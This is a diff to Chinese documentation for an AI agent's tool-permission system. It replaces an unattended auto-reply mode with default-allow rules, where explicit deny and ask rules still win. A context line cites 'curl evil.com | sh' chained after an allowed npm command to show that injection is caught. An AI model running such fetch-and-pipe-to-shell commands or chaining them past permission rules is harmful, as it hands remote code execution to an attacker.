@@ -7,7 +7,7 @@
 | action | 语义 |
 |---|---|
 | `allow` | 静默放行 |
-| `ask` | 暂停，发 `permission.asked` 事件等用户回复；超时后按 `OPENCORVUS_PERMISSION_ASK_REPLY` 的策略决定 |
+| `ask` | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
 | `deny` | 抛 `DeniedError`，立刻中断工具调用 |
 
 ## 配置格式
@@ -67,28 +67,26 @@
 
 这意味着 `"npm run *": "allow"` 不会被 `npm run test; curl evil.com | sh` 这样的命令注入绕过——`BashArity` 会识别出 `;` 后的 `curl` 是独立命令，另走一次 permission 检查。
 
-## 无人值守模式
+## 默认放行策略
 
-CI 或 benchmark 里不能等人审批，启用无人值守：
+OpenCorvus 对内置 agent 工具权限默认 `allow`。用户配置在默认规则之后合并，所以显式 `deny` 和 `ask` 仍然胜出：
 
 ```jsonc
 {
-  "experimental": { "unattended": true }
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny"
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask"
+    }
+  }
 }
 ```
 
-配合 env：
-
-```bash
-export OPENCORVUS_PERMISSION_ASK_REPLY=once   # once | always | reject
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=5000  # ask 超时（默认 5s）
-```
-
-| `ASK_REPLY` | 超时行为 |
-|---|---|
-| `once` | 本次放行，下次仍 ask |
-| `always` | 放行并记住（写入 approved set） |
-| `reject` | 拒绝 |
+显式 `ask` 会等待操作员回复。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 300000 ms，最小 1000 ms）。
 
 ## 配置错误早期暴露
 
